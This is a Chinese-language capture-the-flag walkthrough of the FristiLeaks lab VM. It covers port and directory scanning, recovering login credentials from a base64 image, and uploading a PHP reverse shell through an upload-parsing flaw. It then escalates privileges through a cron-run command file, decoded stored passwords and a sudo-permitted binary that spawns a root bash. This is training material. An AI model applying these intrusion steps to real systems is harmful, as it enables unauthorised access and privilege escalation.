# 靶机搭建

打开镜像，网络模式net,MAC地址08:00:27:A5:A6:76，开启靶机会给出IP地址。

# 信息收集

### 1.CMS

![1667616212_6365cdd430dc06ae05e1d.png!small?1667616212143](https://image.3001.net/images/20221105/1667616212_6365cdd430dc06ae05e1d.png!small?1667616212143)

    
    
    searchsploit apache 2.2.15  
    searchsploit php 5.3.3

php 5.3.3 一大堆漏洞可以后期利用

![1667616245_6365cdf5195030754872f.png!small?1667616245208](https://image.3001.net/images/20221105/1667616245_6365cdf5195030754872f.png!small?1667616245208)

apache 2.2.15

![1667616254_6365cdfe04b7c2f2ab084.png!small?1667616254121](https://image.3001.net/images/20221105/1667616254_6365cdfe04b7c2f2ab084.png!small?1667616254121)

### 2.端口扫描

    
    
    nmap -T4 -A -p- -v 192.168.1.119

![1667616267_6365ce0b335cfc6d8cdb5.png!small?1667616267257](https://image.3001.net/images/20221105/1667616267_6365ce0b335cfc6d8cdb5.png!small?1667616267257)

### 3.目录扫描

感觉没啥有用目录。可以将完网站元素作为目录进行尝试访问。

    
    
    dirsearch -u http://192.168.1.119 -i 200 301

![1667616279_6365ce17c87c793b84bf9.png!small?1667616279787](https://image.3001.net/images/20221105/1667616279_6365ce17c87c793b84bf9.png!small?1667616279787)

    
    
    feroxbuster -u http://192.168.1.119 -e -s 200 301

![1667616290_6365ce22d71bfab9891ac.png!small?1667616290940](https://image.3001.net/images/20221105/1667616290_6365ce22d71bfab9891ac.png!small?1667616290940)

    
    
    http://192.168.1.119/images/ 图片目录  
    http://192.168.1.119/robots.txt

![1667616300_6365ce2c4f443a20fc128.png!small?1667616300176](https://image.3001.net/images/20221105/1667616300_6365ce2c4f443a20fc128.png!small?1667616300176)

# 渗透

### 1.尝试网站元素作为目录进行访问

    
    
    http://192.168.1.119/fristi  
    图片是个base64加密图片  还给个提示信息:eezeepz

![1667616313_6365ce397d88bd45159ce.png!small?1667616313476](https://image.3001.net/images/20221105/1667616313_6365ce397d88bd45159ce.png!small?1667616313476)

对加密图片进行解密图片格式输出。

    
    
    base64 -d f.png > fd.png  
    display fd.png     

![1667616353_6365ce61a74ff0debd1be.png!small?1667616353802](https://image.3001.net/images/20221105/1667616353_6365ce61a74ff0debd1be.png!small?1667616353802)

kekkekkekkekkEkkEk

![1667616373_6365ce7555266fdcd2fc8.png!small?1667616373262](https://image.3001.net/images/20221105/1667616373_6365ce7555266fdcd2fc8.png!small?1667616373262)

### 2.作为用户名密码登录

    
    
    eezeepz  
    kekkekkekkekkEkkEk

![1667616390_6365ce869c4909800c0c2.png!small?1667616390566](https://image.3001.net/images/20221105/1667616390_6365ce869c4909800c0c2.png!small?1667616390566)

上传文件：

图片能够上传成功给出上传路径/uploads

![1667616404_6365ce94e556e46c6f46c.png!small?1667616404947](https://image.3001.net/images/20221105/1667616404_6365ce94e556e46c6f46c.png!small?1667616404947)

猜解文件路径：

    
    
    http://192.168.1.119/fristi/uploads/11.jpg

![1667616417_6365cea1a61562576c4f5.png!small?1667616417795](https://image.3001.net/images/20221105/1667616417_6365cea1a61562576c4f5.png!small?1667616417795)

存在解析漏洞

![1667616440_6365ceb8e12b401ca702f.png!small?1667616440998](https://image.3001.net/images/20221105/1667616440_6365ceb8e12b401ca702f.png!small?1667616440998)

### 3.利用解析漏洞构造反弹shell

![1667616454_6365cec6bff194ebb4645.png!small?1667616454713](https://image.3001.net/images/20221105/1667616454_6365cec6bff194ebb4645.png!small?1667616454713)

绕过检测：

![1667616469_6365ced59ae58eea20c90.png!small?1667616469522](https://image.3001.net/images/20221105/1667616469_6365ced59ae58eea20c90.png!small?1667616469522)

但是kali监听不到。

用kali自带的webshell:webshell:/usr/share/webshells/php/php-reverse-shell.php

![1667616490_6365ceea8f0f14e127eb6.png!small?1667616490650](https://image.3001.net/images/20221105/1667616490_6365ceea8f0f14e127eb6.png!small?1667616490650)

# 提权

### 1.查看靶机目录

    
    
    /home   
    ​  
    admin  
    eezeepz   这个可以打开  
    fristigod  
    ​  
    再eezeepz下的notes.txt发现执行计划命令改变/home/admin权限

![1667616507_6365cefb12507fef26943.png!small?1667616507014](https://image.3001.net/images/20221105/1667616507_6365cefb12507fef26943.png!small?1667616507014)

    
    
    再/home目录下执行:  
    echo "/home/admin/chmod 777 /home/admin" >/tmp/runthis

![1667616520_6365cf088a1afc1234a0a.png!small?1667616520616](https://image.3001.net/images/20221105/1667616520_6365cf088a1afc1234a0a.png!small?1667616520616)

cryptpass.py

    
    
    #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn  
    importbase64,codecs,sys  
    ​  
    defencodeString(str):  
    base64string= base64.b64encode(str) #base64加密  
    returncodecs.encode(base64string[::-1], 'rot13') #对字符进行发转，再进行rot13加密。  
    ​  
    cryptoResult=encodeString(sys.argv[1]) #引入外部参数  
    printcryptoResult

cryptedpass.txt

    
    
    mVGZ3O3omkJLmy2pcuTq 解密：thisisalsopw123

whoisyourgodnow.txt

    
    
    =RFn0AKnlMHMPIzpyuTI0ITG 解密：LetThereBeFristi!

解密脚本：

![1667616543_6365cf1f019277679e482.png!small?1667616542998](https://image.3001.net/images/20221105/1667616543_6365cf1f019277679e482.png!small?1667616542998)

### 2.切换admin用户

密码：thisisalsopw123

    
    
    sudo -l  
    admin 用户sudo可以执行的命令

![1667616642_6365cf82a47b20722c34d.png!small?1667616642651](https://image.3001.net/images/20221105/1667616642_6365cf82a47b20722c34d.png!small?1667616642651)

    
    
    find / -perm -u=s -type f 2>/dev/null  
    admin用户没可利用的SUID权限位且属主为root的文件

![1667616572_6365cf3c29ed6491022d1.png!small?1667616572553](https://image.3001.net/images/20221105/1667616572_6365cf3c29ed6491022d1.png!small?1667616572553)

### 3.切换fristigod用户

密码：LetThereBeFristi!

sudo -l 查看可利用root命令

![1667616674_6365cfa23a877365f9a04.png!small?1667616674302](https://image.3001.net/images/20221105/1667616674_6365cfa23a877365f9a04.png!small?1667616674302)

  

    
    
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash  
    生成bash

flag:

![1667616696_6365cfb88daedbc00081b.png!small?1667616696530](https://image.3001.net/images/20221105/1667616696_6365cfb88daedbc00081b.png!small?1667616696530)

# 总结：

  * 当获取的端口,cms,目录信息少的时候尝试利用网页元素。

  * 善于收集中间件，数据库，mysql版本漏洞

  * 基本py脚本的使用

  * sudo -l 查看当前用户sudo可以执行的命令 

  * 利用sudo 可执行的命令生成bash

